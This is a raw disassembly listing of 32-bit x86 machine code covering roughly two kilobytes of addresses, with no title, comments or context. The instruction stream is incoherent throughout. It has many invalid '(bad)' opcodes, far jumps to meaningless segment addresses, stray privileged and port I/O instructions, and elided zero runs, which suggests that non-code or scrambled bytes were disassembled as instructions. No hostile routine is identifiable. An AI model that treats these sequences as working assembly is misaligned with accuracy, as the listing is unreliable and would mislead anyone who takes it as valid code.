  41cd32:	mov    DWORD PTR [ebp+0x6b],edx
  41cd35:	or     BYTE PTR [ebx-0x10],dl
  41cd38:	jmp    0x8165:0x268bdfb9
  41cd3f:	js     0x41cdb4
  41cd41:	add    eax,0x486840d
  41cd46:	add    BYTE PTR [eax],al
  41cd48:	or     DWORD PTR ds:0xd1d8006a,eax
  41cd4e:	fisttp WORD PTR [ebx+0x51010d0e]
  41cd54:	outs   dx,DWORD PTR ds:[esi]
  41cd55:	mov    bh,0xfc
  41cd57:	adc    eax,0x0
	...
  41cd64:	add    BYTE PTR [eax],al
  41cd66:	add    BYTE PTR [ebx],bl
  41cd68:	mov    ecx,0xc8da003e
  41cd6d:	sti    
  41cd6e:	mov    ebx,DWORD PTR [esi+0x63388165]
  41cd74:	fst    DWORD PTR [esi]
  41cd76:	mov    esp,DWORD PTR [esi+0x5b558965]
  41cd7c:	push   es
  41cd7d:	jns    0x45cb3f11
  41cd83:	add    ecx,DWORD PTR [edi-0x329ff7b5]
  41cd89:	jns    0x182b272d
  41cd8f:	fdivr  DWORD PTR [eax+0xda68bdf]
  41cd95:	add    DWORD PTR [edx+0x53],eax
  41cd98:	mov    WORD PTR [ebx-0xc],es
  41cd9b:	fcom   st(0)
  41cd9d:	fisttp WORD PTR [ebx+0x11010d8e]
  41cda3:	jmp    0x5d:0x1ec7ebb8
  41cdaa:	add    BYTE PTR [ebx+0x5],ah
  41cdad:	mov    DWORD PTR [ebp-0x3d],eax
  41cdb0:	xchg   BYTE PTR [eax+0x10],bh
  41cdb3:	arpl   cx,bx
  41cdb5:	or     al,0x8b
  41cdb7:	es cmp DWORD PTR gs:[ecx],0xc704d963
  41cdbf:	push   ds
  41cdc0:	pop    ebp
  41cdc1:	(bad)  
  41cdc2:	jmp    DWORD PTR [ebx+0x5]
  41cdc5:	mov    DWORD PTR [ebp-0x71],edx
  41cdc8:	xchg   BYTE PTR [edx],bh
	...
  41cdda:	pop    ss
  41cddb:	in     al,0x88
  41cddd:	inc    ebp
  41cdde:	(bad)  
  41cddf:	mov    cs,WORD PTR [eax]
  41cde1:	add    DWORD PTR [edx-0x1cfffffb],0x168b1bd9
  41cdeb:	pop    ecx
  41cdec:	mov    DWORD PTR [edx],eax
  41cdee:	ds (bad) 
  41cdf0:	std    
  41cdf1:	(bad)  
  41cdf2:	fdiv   QWORD PTR [ebp-0x4ba8b278]
  41cdf8:	out    0xb5,eax
  41cdfa:	dec    esi
  41cdfb:	(bad)  
  41cdfc:	std    
  41cdfd:	sbb    DWORD PTR [edi],0xd
  41ce00:	xchg   DWORD PTR [ebp+0x1f],eax
  41ce03:	outs   dx,BYTE PTR ds:[esi]
  41ce04:	sbb    al,0x8b
  41ce06:	mov    ds,WORD PTR [ecx-0x77]
  41ce09:	add    bl,al
  41ce0b:	iret   
  41ce0c:	pop    es
  41ce0d:	lea    ecx,[edi-0x17adfdf3]
  41ce13:	(bad)  
  41ce14:	sti    
  41ce15:	push   eax
  41ce16:	or     edi,DWORD PTR [edx-0x5]
  41ce19:	dec    DWORD PTR [esi+eax*4]
  41ce1c:	les    ecx,FWORD PTR [eax]
  41ce1e:	fcmovb st,st(7)
  41ce20:	fisttp DWORD PTR [ebx+0x558959ae]
  41ce26:	pop    ss
  41ce27:	mov    WORD PTR [edi],cs
  41ce29:	mov    esp,DWORD PTR [esi+0x5fc08159]
  41ce2f:	mov    WORD PTR [ebx-0xc],es
  41ce32:	call   0xa2c5ba06
  41ce37:	or     BYTE PTR [edi-0x6a9240b3],al
  41ce3d:	mov    eax,DWORD PTR [eax]
	...
  41ce4b:	add    BYTE PTR [eax],al
  41ce4d:	cs gs add edx,0xe0538c57
  41ce55:	retf   0xfd12
  41ce58:	jmp    FWORD PTR [ebp+ecx*4+0x50a05de3]
  41ce5f:	int3   
  41ce60:	int3   
  41ce61:	ss mov gs,esp
  41ce64:	add    DWORD PTR [edi+0x61f0680c],0xffffffc5
  41ce6b:	(bad)  
  41ce6c:	(bad)  
  41ce6d:	outs   dx,BYTE PTR ds:[esi]
  41ce6e:	inc    ebp
  41ce6f:	push   ebx
  41ce70:	inc    ecx
  41ce71:	arpl   WORD PTR [ebx+eax*2+0x2610bf8],cx
  41ce78:	inc    eax
  41ce79:	arpl   WORD PTR [esi+0x6d13f843],cx
  41ce7f:	ds std 
  41ce81:	pop    esp
  41ce82:	popa   
  41ce83:	add    esp,0xfc438e6b
  41ce89:	fcom   st(2)
  41ce8b:	sqrtps xmm3,xmm0
  41ce8e:	mov    edx,0xcae8520b
  41ce93:	pop    es
  41ce94:	push   eax
  41ce95:	xor    al,0xbb
  41ce97:	sti    
  41ce98:	mov    eax,DWORD PTR [esi-0x3d]
  41ce9b:	ror    ah,0x17
  41ce9e:	push   edx
  41ce9f:	int3   
  41cea0:	int3   
  41cea1:	mov    dh,0x8c
  41cea3:	in     al,dx
  41cea4:	mov    eax,ds:0x3eb777
  41cea9:	and    eax,0x6e8b6806
  41ceae:	stc    
  41ceaf:	push   ebp
  41ceb0:	inc    ecx
	...
  41cebd:	add    BYTE PTR [eax],al
  41cebf:	add    BYTE PTR [ebx-0x72],ah
  41cec2:	push   eax
  41cec3:	add    DWORD PTR [ecx+0x66508844],esi
  41cec9:	ret    0xccc0
  41cecc:	pop    ss
  41cecd:	push   edx
  41cece:	int3   
  41cecf:	int3   
  41ced0:	ss mov esp,gs
  41ced3:	add    edi,0x11
  41ced6:	lahf   
  41ced7:	adc    BYTE PTR ds:0xb18affc6,dh
  41cedd:	adc    al,0xc7
  41cedf:	ds call 0x91ccfeaa
  41cee5:	mov    edx,ss
  41cee7:	ds fmul st,st(5)
  41ceea:	or     ecx,DWORD PTR [ebx-0xbb4716f]
  41cef0:	call   0x2bcdc2bf
  41cef5:	adc    DWORD PTR [edi+0x538c8b4d],eax
  41cefb:	clc    
  41cefc:	fidivr DWORD PTR [edx+0x562b8fb]
  41cf02:	add    BYTE PTR [eax],al
  41cf04:	fiadd  WORD PTR [ebp+0x74]
  41cf07:	inc    esp
  41cf08:	loopne 0x41ceec
  41cf0a:	test   DWORD PTR [eax],0xc03108ee
  41cf10:	dec    eax
  41cf11:	and    DWORD PTR [ecx+0x4f8c5b4d],ecx
  41cf17:	sbb    BYTE PTR [eax+0x6a7507ba],cl
  41cf1d:	mov    WORD PTR [ebx-0x8],es
  41cf20:	call   0xcadaf6
	...
  41cf31:	add    BYTE PTR [eax],al
  41cf33:	stos   DWORD PTR es:[edi],eax
  41cf34:	add    DWORD PTR [ecx+0x438c2b55],ecx
  41cf3a:	adc    dl,bl
  41cf3c:	ret    0xb817
  41cf3f:	bound  eax,QWORD PTR ds:0xfd080000
  41cf45:	mov    BYTE PTR [ebp+0xb],cl
  41cf48:	mov    WORD PTR [edi],cs
  41cf4a:	mov    DWORD PTR [esi-0x4ba76a3],ebp
  41cf50:	sbb    eax,DWORD PTR [ebx-0x4]
  41cf53:	outs   dx,BYTE PTR ds:[esi]
  41cf54:	or     DWORD PTR [ecx],esi
  41cf56:	sar    al,0x8
  41cf59:	jmp    0x89870011
  41cf5e:	in     eax,0x3e
  41cf60:	inc    esp
  41cf61:	int3   
  41cf62:	int3   
  41cf63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf64:	push   eax
  41cf65:	int3   
  41cf66:	int3   
  41cf67:	lahf   
  41cf68:	push   eax
  41cf69:	int3   
  41cf6a:	int3   
  41cf6b:	xchg   edi,eax
  41cf6c:	push   eax
  41cf6d:	int3   
  41cf6e:	int3   
  41cf6f:	push   ss
  41cf70:	mov    esp,gs
  41cf72:	add    edi,0xfffffffc
  41cf75:	les    eax,FWORD PTR [ebp-0x55]
  41cf78:	add    al,0x30
  41cf7a:	add    BYTE PTR [ebx-0x13],ah
  41cf7d:	add    eax,DWORD PTR [ebx]
  41cf7f:	and    eax,DWORD PTR ds:0xc62efc9f
  41cf85:	dec    DWORD PTR [edi+0x7b]
  41cf88:	mov    bl,0xfb
  41cf8a:	inc    DWORD PTR [ebx+eax*4-0x3615f73c]
  41cf91:	repz push 0x23
  41cf94:	mov    WORD PTR [ebx-0x8],cs
	...
  41cfa3:	add    BYTE PTR [eax],al
  41cfa5:	add    BYTE PTR [edx],dl
  41cfa7:	mov    WORD PTR [ebx],ss
  41cfa9:	fmul   QWORD PTR [esi]
  41cfab:	(bad)  
  41cfac:	dec    DWORD PTR [edx+0x6a4fb5a1]
  41cfb2:	arpl   WORD PTR [esi+0x53],bx
  41cfb5:	hlt    
  41cfb6:	add    BYTE PTR [edx],bh
  41cfb8:	push   ebx
  41cfb9:	inc    ecx
  41cfba:	arpl   WORD PTR [edx-0x3b692bc5],ax
  41cfc0:	(bad)  
  41cfc1:	jmp    FWORD PTR [esi+0x6302b806]
  41cfc7:	add    eax,0x8ab9eb00
  41cfcc:	or     eax,DWORD PTR [eax]
  41cfce:	popa   
  41cfcf:	(bad)  
  41cfd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfd3:	push   ebp
  41cfd4:	push   0x4b600
  41cfd9:	push   0x400363
  41cfde:	call   0xa297a3db
  41cfe3:	add    eax,0x363c27f
  41cfe8:	add    BYTE PTR [eax],al
  41cfea:	xchg   ecx,eax
  41cfeb:	ins    DWORD PTR es:[edi],dx
  41cfec:	sahf   
  41cfed:	(bad)  
  41cfee:	fcomp  QWORD PTR [esi-0x7f]
  41cff1:	les    esp,FWORD PTR [edi-0x63]
  41cff4:	add    BYTE PTR [edx],al
  41cff6:	and    eax,DWORD PTR ds:0x561002b
  41cffc:	add    BYTE PTR [ebx+0x4153396e],cl
  41d002:	arpl   WORD PTR [edx],bp
  41d004:	enter  0x5e89,0x9
  41d008:	push   esi
  41d009:	inc    ecx
	...
  41d016:	add    BYTE PTR [eax],al
  41d018:	add    BYTE PTR [ebx-0x76],ah
  41d01b:	adc    eax,DWORD PTR [esi*1-0x3dae003c]
  41d022:	cmp    DWORD PTR [ebx+0x41],edx
  41d025:	arpl   WORD PTR [ebp-0x4b6cb278],si
  41d02b:	out    0x9d,eax
  41d02d:	jg     0x41d08d
  41d02f:	std    
  41d030:	sbb    DWORD PTR [edi-0x68ea76ef],0xffffffb8
  41d037:	add    BYTE PTR ds:[eax-0x48],ah
  41d03b:	pop    es
  41d03c:	mov    DWORD PTR [esi+0x4b55896d],esi
  41d042:	pop    esi
  41d043:	loop   0x41cfd0
  41d045:	inc    esi
  41d046:	rol    al,0xcc
  41d049:	pop    ss
  41d04a:	push   ecx
  41d04b:	int3   
  41d04c:	int3   
  41d04d:	xchg   esi,eax
  41d04e:	mov    ch,ah
  41d050:	mov    ebx,DWORD PTR [esi+0x5f45390d]
  41d056:	rol    BYTE PTR [ebx+ecx*4],cl
  41d059:	sahf   
  41d05a:	or     eax,0x20805e9
  41d05f:	mov    DWORD PTR [ebp+0x67],eax
  41d062:	rol    al,0xcc
  41d065:	pop    ds
  41d066:	push   ecx
  41d067:	int3   
  41d068:	int3   
  41d069:	pop    ss
  41d06a:	push   ecx
  41d06b:	int3   
  41d06c:	int3   
  41d06d:	xchg   esi,eax
  41d06e:	mov    ch,ah
  41d070:	add    DWORD PTR [edi],0x31
  41d073:	lds    eax,FWORD PTR [ebp-0x11]
  41d076:	add    al,0x70
  41d078:	add    DWORD PTR [ebx-0x76],esp
  41d07b:	inc    ebx
  41d07c:	or     BYTE PTR [eax],al
	...
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	jmp    0x893d:0x268bd7c7
  41d093:	push   ebp
  41d094:	pop    ebx
  41d095:	add    cl,BYTE PTR [edi+0x3c]
  41d098:	fidiv  DWORD PTR [edi+0x65268bdf]
  41d09e:	or     eax,0x88f92bb7
  41d0a3:	push   ebp
  41d0a4:	ret    
  41d0a5:	pop    DWORD PTR [edx+ecx*1+0x4b]
  41d0a9:	mov    WORD PTR [ebx-0x18],es
  41d0ac:	or     edi,ecx
  41d0ae:	add    BYTE PTR [eax+0x63],al
  41d0b1:	mov    cl,BYTE PTR [ebx]
  41d0b3:	cld    
  41d0b4:	ss (bad) 
  41d0b6:	call   DWORD PTR [eax+0x7b]
  41d0b9:	int    0xf8
  41d0bb:	(bad)  
  41d0bc:	jl     0x41d03f
  41d0be:	les    ecx,FWORD PTR [eax]
  41d0c0:	jmp    0xffed:0x236aefc7
  41d0c7:	das    
  41d0c8:	arpl   WORD PTR ds:0x6d30068,ax
  41d0ce:	add    BYTE PTR [edx+0x63],ch
  41d0d1:	pop    esp
  41d0d2:	push   ebx
  41d0d3:	lock fcmovb st,st(2)
  41d0d6:	jecxz  0x41d063
  41d0d8:	scas   al,BYTE PTR es:[edi]
  41d0d9:	mov    DWORD PTR gs:[edx-0x69],eax
  41d0dd:	mov    ch,0x88
  41d0df:	dec    ebp
  41d0e0:	imul   esi,DWORD PTR [esi-0x47b8aa78],0xffffffe7
  41d0e7:	shl    DWORD PTR [esi],0x5d
  41d0ea:	std    
  41d0eb:	and    DWORD PTR [edi],0xa
  41d0ee:	lds    eax,FWORD PTR [ebp+0x0]
	...
  41d0fd:	add    BYTE PTR [eax],al
  41d0ff:	clts   
  41d101:	add    BYTE PTR [eax],al
  41d103:	arpl   WORD PTR [eax+0x7],si
  41d106:	mov    ebx,DWORD PTR [esi+0x62c08151]
  41d10c:	mov    es,WORD PTR [ebx-0xc]
  41d10f:	call   0xb451b0de
  41d114:	mov    dh,0x5
  41d116:	cmp    DWORD PTR [esi-0x17a68eaf],ecx
  41d11c:	ret    0x83e7
  41d11f:	pop    ebx
  41d120:	icebp  
  41d121:	push   DWORD PTR [ebx+0x26]
  41d124:	nop
  41d125:	dec    ebx
  41d126:	call   0x51b00b
  41d12b:	aaa    
  41d12c:	sbb    DWORD PTR [ecx+0x4290cb55],ecx
  41d132:	adc    al,bl
  41d134:	retf   0x8bdf
  41d137:	adc    bl,BYTE PTR [ecx]
  41d139:	mov    eax,DWORD PTR [ebx+esi*2+0x5c]
  41d13d:	mov    DWORD PTR [ebp-0x7d],ecx
  41d140:	sbb    dl,dl
  41d142:	not    DWORD PTR [edx]
  41d144:	sbb    DWORD PTR [ecx-0x52f37cab],ecx
  41d14a:	inc    edx
  41d14b:	aas    
  41d14c:	mov    ch,0x88
  41d14e:	inc    ebp
  41d14f:	mov    edx,DWORD PTR [eax-0x329ff7b5]
  41d155:	adc    edx,DWORD PTR [ecx-0x28]
  41d158:	mov    dl,0xe7
  41d15a:	mov    esp,DWORD PTR [esi+0x67420161]
  41d160:	mov    ch,0xe7
  41d162:	push   ebp
	...
  41d16f:	add    BYTE PTR [eax],al
  41d171:	add    BYTE PTR [esi+0x5c],cl
  41d174:	std    
  41d175:	sbb    DWORD PTR [edi],0x9
  41d178:	mov    DWORD PTR [ebp+0x4b],ecx
  41d17b:	mov    BYTE PTR [edi-0x183615d8],bh
  41d181:	jmp    0x41d154
  41d183:	(bad)  
  41d184:	push   ebx
  41d185:	in     al,0x91
  41d187:	ins    DWORD PTR es:[edi],dx
  41d188:	push   cs
  41d189:	cld    
  41d18a:	sbb    al,0x5c
  41d18c:	add    esp,0x323ed5f
  41d192:	mov    ds:0xaefc9f05,eax
  41d197:	(bad)  
  41d198:	dec    DWORD PTR [edi+0xb]
  41d19b:	nop
  41d19c:	cli    
  41d19d:	push   esp
  41d19f:	xchg   esp,eax
  41d1a1:	or     dl,bl
  41d1a3:	rcr    ebx,0x83
  41d1a6:	es pop ebp
  41d1a8:	push   ebx
  41d1a9:	inc    ecx
  41d1aa:	arpl   WORD PTR ds:0x9e80a73,ax
  41d1b0:	lock push ebp
  41d1b2:	and    al,BYTE PTR ds:0x392eff4f
  41d1b8:	cmp    DWORD PTR ds:0x3eb1bb,0x6a1bd263
  41d1c2:	and    ebp,ebp
  41d1c4:	jmp    FWORD PTR [edi]
  41d1c6:	arpl   WORD PTR ds:0xb69f5589,ax
  41d1cc:	mov    BYTE PTR [ebp-0x7d],al
  41d1cf:	(bad)
  41d1d3:	pop    esp
  41d1d4:	push   ebx
  41d1d5:	lock add BYTE PTR [eax],al
	...
  41d1e4:	add    al,al
  41d1e6:	xor    BYTE PTR [ebx+0x41],dl
  41d1e9:	arpl   WORD PTR [eax+0x13],si
  41d1ec:	push   0x23
  41d1ee:	in     eax,dx
  41d1ef:	jmp    FWORD PTR [edi]
  41d1f1:	arpl   WORD PTR ds:0xb6675589,ax
  41d1f7:	imul   eax,DWORD PTR [eax],0xa3efb15c
  41d1fd:	das    
  41d1fe:	mov    cl,0x3e
  41d200:	add    al,ah
  41d202:	sbb    ah,dl
  41d204:	push   ebp
  41d205:	mov    ds:0x56750005,al
  41d20a:	out    dx,eax
  41d20b:	aas    
  41d20c:	push   0x1563
  41d211:	fadd   st,st(0)
  41d213:	sti    
  41d214:	push   eax
  41d215:	mov    ecx,0x1355fd05
  41d21a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d21b:	aam    0x55
  41d21d:	mov    ds:0x74d8905,al
  41d222:	lea    ecx,[ebx-0x28]
  41d225:	fdiv   DWORD PTR [eax+0x3da68bd7]
  41d22b:	add    DWORD PTR [edx+0x37],eax
  41d22e:	mov    WORD PTR [ebx-0x20],es
  41d231:	fmul   st,st(0)
  41d233:	sti    
  41d234:	push   ecx
  41d235:	fdiv   DWORD PTR [eax+0x320252e3]
  41d23b:	push   ebx
  41d23c:	inc    ecx
  41d23d:	arpl   WORD PTR [ebp+0x5acf95e7],si
  41d243:	std    
  41d244:	sbb    DWORD PTR [edi+0x4d8909],0x0
	...
  41d257:	add    bl,al
  41d259:	xchg   BYTE PTR [edi+0x563a4],dh
  41d25f:	add    BYTE PTR [edi],dh
  41d261:	pop    ds
  41d262:	mov    DWORD PTR [ebp-0x3d],edx
  41d265:	mov    es,WORD PTR [ebx-0x28]
  41d268:	pusha  
  41d269:	xchg   DWORD PTR [eax-0x78fa9d00],esp
  41d26f:	inc    ebp
  41d270:	jg     0x41d200
  41d272:	dec    ebx
  41d273:	loopne 0x41d24d
  41d275:	lock rcl DWORD PTR [ebp+0x22],cl
  41d279:	add    eax,0x8c2f5129
  41d27e:	adc    eax,DWORD PTR [edx*1+0x5fa0ffc4]
  41d285:	mov    bl,0x3e
  41d287:	add    BYTE PTR [ebx-0x512bf472],dh
  41d28d:	(bad)  
  41d28e:	call   DWORD PTR [eax-0x28]
  41d291:	scas   eax,DWORD PTR es:[edi]
  41d292:	jmp    0x41d2e6
  41d294:	cmp    ebx,edx
  41d296:	stc    
  41d297:	(bad)  
  41d298:	cmp    al,0x86
  41d29a:	les    ecx,FWORD PTR [eax+ebp*8]
  41d29d:	mov    edi,0x315e8bdf
  41d2a2:	push   ebx
  41d2a3:	inc    ecx
  41d2a4:	arpl   WORD PTR [esi],ax
  41d2a6:	dec    eax
  41d2a7:	sub    dl,ch
  41d2a9:	pop    es
  41d2aa:	adc    al,0x56
  41d2ac:	mov    ds:0xb3d8105,al
  41d2b1:	mov    al,0x3e
  41d2b3:	add    BYTE PTR [ebx-0x30],ah
  41d2b6:	sub    cl,BYTE PTR [ebx+0x41533156]
	...
  41d2c8:	add    BYTE PTR [eax],al
  41d2ca:	add    BYTE PTR [ebx-0x49],ah
  41d2cd:	sahf   
  41d2ce:	adc    al,0x95
  41d2d0:	(bad)  
  41d2d1:	dec    DWORD PTR [edi-0x28]
  41d2d4:	pop    es
  41d2d5:	lock push ebp
  41d2d7:	and    al,BYTE PTR ds:0x595be84f
  41d2dd:	std    
  41d2de:	jmp    eax
  41d2e0:	inc    eax
  41d2e1:	or     al,0x8b
  41d2e3:	outs   dx,BYTE PTR ds:[esi]
  41d2e4:	xor    DWORD PTR [ebx+0x41],edx
  41d2e7:	arpl   WORD PTR [edi+0x59ba49e7],si
  41d2ed:	std    
  41d2ee:	and    DWORD PTR [edi+0x3b61e900],0x11
  41d2f5:	add    DWORD PTR [eax+0x63],eax
  41d2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2f9:	cld    
  41d2fa:	push   ebp
  41d2fb:	and    al,BYTE PTR ds:0x5c37e850
  41d301:	std    
  41d302:	jmp    eax
  41d304:	inc    eax
  41d305:	or     BYTE PTR [ecx+0xd893126],cl
  41d30b:	(bad)  
  41d30c:	scas   eax,DWORD PTR es:[edi]
  41d30d:	add    BYTE PTR ds:[edx],dl
  41d310:	mov    ss,WORD PTR [ebx-0x20]
  41d313:	ret    0x5330
  41d316:	inc    ecx
  41d317:	arpl   WORD PTR [edx+eax*2],ax
  41d31a:	sub    BYTE PTR [ebx-0x490ff474],dh
  41d320:	(bad)  
  41d321:	call   DWORD PTR [eax+0x3b]
  41d324:	sub    esp,edi
  41d326:	(bad)  
  41d327:	cmp    al,0x85
  41d329:	les    ecx,FWORD PTR [eax+ebp*8]
  41d32c:	repnz out dx,eax
  41d32e:	push   ebp
	...
  41d33b:	add    BYTE PTR [eax],al
  41d33d:	add    BYTE PTR [edx-0x6c3d80fb],ah
  41d343:	mov    ah,0xfe
  41d345:	(bad)  
  41d346:	jmp    0x8b05:0xa2561bf2
  41d34d:	inc    ebp
  41d34e:	or     esi,DWORD PTR [esi-0x86bf97]
  41d354:	mov    BYTE PTR ds:0x3eaf5f,cl
  41d35a:	xchg   edx,eax
  41d35b:	pop    eax
  41d35c:	push   ebx
  41d35d:	aam    0xfb
  41d35f:	fs stc 
  41d361:	jmp    esp
  41d363:	popf   
  41d364:	(bad)  
  41d365:	jmp    DWORD PTR [ebx+0x5]
  41d368:	mov    ebp,esp
  41d36a:	ss inc ebx
  41d36c:	add    al,0x0
  41d36e:	lahf   
  41d36f:	dec    ecx
  41d370:	int3   
  41d371:	int3   
  41d372:	xchg   edi,eax
  41d373:	dec    ecx
  41d374:	int3   
  41d375:	int3   
  41d376:	push   ss
  41d377:	mov    esp,gs
  41d379:	mov    ebx,DWORD PTR [esi]
  41d37b:	or     eax,0xbaaf4089
  41d380:	ror    ah,0x97
  41d383:	dec    ecx
  41d384:	int3   
  41d385:	int3   
  41d386:	ss mov esp,gs
  41d389:	push   ebx
  41d38a:	sub    eax,0x833d88b0
  41d38f:	mov    dl,0x3e
  41d391:	add    al,bl
  41d393:	cli    
  41d394:	jmp    0x41d3eb
  41d396:	and    al,BYTE PTR ds:0xb29b3589
  41d39c:	add    BYTE PTR ds:[edi+esi*4],cl
  41d3a0:	pop    eax
  41d3a1:	pop    ebp
	...
  41d3ae:	add    BYTE PTR [eax],al
  41d3b0:	add    BYTE PTR [eax-0x493333b7],ah
  41d3b6:	mov    esp,gs
  41d3b8:	push   ecx
  41d3b9:	retf   
  41d3ba:	rol    DWORD PTR [eax],0x40
  41d3bd:	arpl   WORD PTR [esi+0x5a255fc],sp
  41d3c3:	push   eax
  41d3c4:	call   0x3f30d8
  41d3c9:	loopne 0x41d40b
  41d3cb:	or     BYTE PTR [ecx+0x4d8959a6],cl
  41d3d1:	pop    ebx
  41d3d2:	mov    dh,0x69
  41d3d4:	add    al,ch
  41d3d6:	icebp  
  41d3d7:	pop    ss
  41d3d8:	push   esi
  41d3d9:	mov    ds:0xb6ff5205,al
  41d3de:	pop    ecx
  41d3df:	mov    ebp,esp
  41d3e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3e2:	inc    esp
  41d3e3:	int3   
  41d3e4:	int3   
  41d3e5:	xchg   esi,eax
  41d3e6:	mov    esp,gs
  41d3e8:	add    DWORD PTR [edi],0x21
  41d3eb:	lds    eax,FWORD PTR [ebp-0x15]
  41d3ee:	add    al,0x0
  41d3f0:	add    BYTE PTR [ebx+0x40],ah
  41d3f3:	inc    ebx
  41d3f4:	fcomp  QWORD PTR [ebx+0x5]
  41d3f7:	add    BYTE PTR [eax],al
  41d3f9:	pushf  
  41d3fa:	shl    ebx,0x1
  41d3fd:	arpl   WORD PTR ds:0x591ec700,ax
  41d403:	add    BYTE PTR [eax],al
  41d405:	arpl   WORD PTR ds:0x4bf45c5,ax
  41d40b:	add    BYTE PTR [eax],al
  41d40d:	arpl   WORD PTR [ebx+ecx*2-0xff625f8],cx
  41d414:	push   ebp
	...
  41d421:	add    BYTE PTR [eax],al
  41d423:	add    BYTE PTR [edx],ah
  41d425:	add    eax,0x578ca9e8
  41d42a:	std    
  41d42b:	mov    eax,ds:0x3eb193
  41d430:	ds pop eax
  41d432:	std    
  41d433:	add    BYTE PTR [ebx-0x2f],ah
  41d436:	or     eax,edi
  41d438:	pop    esi
  41d439:	pop    ebp
  41d43a:	push   ebx
  41d43b:	inc    ecx
  41d43c:	arpl   WORD PTR ds:0x6c630000,ax
  41d442:	or     al,bh
  41d444:	pop    bp
  41d446:	push   ebx
  41d447:	inc    ecx
  41d448:	arpl   WORD PTR [eax+eax*1],ax
  41d44b:	add    BYTE PTR [ebx-0x7e],ah
  41d44e:	cmp    esi,eax
  41d450:	scas   al,BYTE PTR es:[edi]
  41d451:	(bad)  
  41d452:	(bad)  
  41d453:	push   DWORD PTR [esi+0x3b05c50b]
  41d459:	mov    cl,0x3e
  41d45b:	add    BYTE PTR [ebx+0x5],ah
  41d45e:	add    BYTE PTR [eax],al
  41d460:	loopne 0x41d47a
  41d462:	clc    
  41d463:	push   ebp
  41d464:	mov    ds:0x66750005,al
  41d469:	jmp    0x41d46a
  41d46b:	(bad)  
  41d46c:	jbe    0x41d4b3
  41d46e:	push   ebx
  41d46f:	inc    ecx
  41d470:	arpl   WORD PTR [edx+0x5a255f0],sp
  41d476:	mov    DWORD PTR ds:0x3eb0f3,ecx
  41d47c:	fcmove st,st(0)
  41d47e:	out    0x8b,eax
  41d480:	dec    esi
  41d481:	push   ebp
  41d482:	push   ebx
  41d483:	inc    ecx
  41d484:	arpl   WORD PTR [edx+0xe843],cx
	...
  41d496:	add    BYTE PTR [eax-0x3d],ah
  41d499:	cmp    ecx,DWORD PTR [ecx+0x4d896d26]
  41d49f:	mov    ebx,0x16dc0b8c
  41d4a4:	(bad)  
  41d4a5:	jmp    DWORD PTR [edi+0x13]
  41d4a8:	add    al,BYTE PTR [eax+0x0]
  41d4ab:	lods   al,BYTE PTR ds:[esi]
  41d4ac:	lock mov edi,0xa1052255
  41d4b2:	cld    
  41d4b3:	ss (bad) 
  41d4b5:	inc    esi
  41d4b7:	pop    esi
  41d4b8:	or     DWORD PTR [esi+0x41],edx
  41d4bb:	arpl   ax,dx
  41d4bd:	add    BYTE PTR [eax+0x63],al
  41d4c0:	in     eax,dx
  41d4c1:	pop    edi
  41d4c2:	add    esp,DWORD PTR [ebx]
  41d4c4:	add    eax,0xb0771589
  41d4c9:	add    BYTE PTR ds:[ecx],dl
  41d4cc:	ins    DWORD PTR es:[edi],dx
  41d4cd:	ret    0x64f7
  41d4d0:	push   esi
  41d4d1:	add    esp,0x5608a26b
  41d4d7:	mov    ds:0x5b15fd05,al
  41d4dc:	scas   eax,DWORD PTR es:[edi]
  41d4dd:	add    BYTE PTR ds:[eax],al
  41d4e0:	std    
  41d4e1:	push   ebp
  41d4e2:	inc    ecx
  41d4e3:	arpl   WORD PTR [esp+ecx*1+0x5005a256],sp
  41d4ea:	call   0x3f2be6
  41d4ef:	loopne 0x41d531
  41d4f1:	add    al,0x89
  41d4f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4f4:	push   ebp
  41d4f5:	mov    DWORD PTR [ebp+0x13],ecx
  41d4f8:	mov    ah,0xe7
  41d4fa:	aad    0x0
	...
  41d508:	add    BYTE PTR [eax],al
  41d50a:	or     eax,0x1f83fd56
  41d50f:	add    DWORD PTR [ecx-0x3b690c],esp
  41d515:	mov    cl,BYTE PTR [esi+0x636a5255]
  41d51b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d51c:	hlt    
  41d51d:	push   ebp
  41d51e:	mov    ds:0xffe85005,al
  41d523:	dec    ebp
  41d524:	std    
  41d525:	jmp    eax
  41d527:	inc    eax
  41d528:	or     al,0x8b
  41d52a:	push   ds
  41d52b:	push   ebp
  41d52c:	xchg   DWORD PTR [ebp-0x3d],ecx
  41d52f:	mov    DWORD PTR [ebx-0x4],edx
  41d532:	js     0x41d4e4
  41d534:	out    dx,eax
  41d535:	jae    0x41d550
  41d537:	mov    al,BYTE PTR [ebx-0x20]
  41d53a:	adc    ecx,DWORD PTR [edx+0x6d12dc4b]
  41d540:	scas   al,BYTE PTR es:[edi]
  41d541:	sti    
  41d542:	pushf  
  41d543:	push   ebp
  41d544:	add    esp,0x5600a26b
  41d54a:	and    al,BYTE PTR ds:0xaf631589
  41d550:	add    BYTE PTR ds:[ecx],dl
  41d553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d554:	or     al,0x56
  41d556:	and    al,BYTE PTR ds:0xb4874501
  41d55c:	mov    BYTE PTR ds:0x3eaf6f,cl
  41d562:	pusha  
  41d563:	ret    0x51fb
  41d566:	dec    ebx
  41d567:	cmp    eax,0x894cfff7
  41d56c:	les    ecx,FWORD PTR [eax+eax*1]
	...
  41d57b:	add    BYTE PTR [eax],al
  41d57d:	fdivr  DWORD PTR [edx+0x319603f3]
  41d583:	add    DWORD PTR [ebp+0x3f],edx
  41d586:	jg     0x41d5db
  41d588:	in     al,0xd8
  41d58a:	retf   0x3fb
  41d58d:	sahf   
  41d58e:	xor    DWORD PTR [edi+0x4b811f45],eax
  41d594:	loopne 0x41d5de
  41d596:	add    al,BYTE PTR [eax]
  41d598:	push   esi
  41d599:	mov    ds:0x34d8705,al
  41d59e:	popa   
  41d59f:	sahf   
  41d5a0:	(bad)  
  41d5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a2:	dec    ebp
  41d5a3:	add    BYTE PTR [eax],al
  41d5a5:	arpl   WORD PTR ds:0xbad809e9,ax
  41d5ab:	test   DWORD PTR [ebx+0x55870a21],0xf84380db
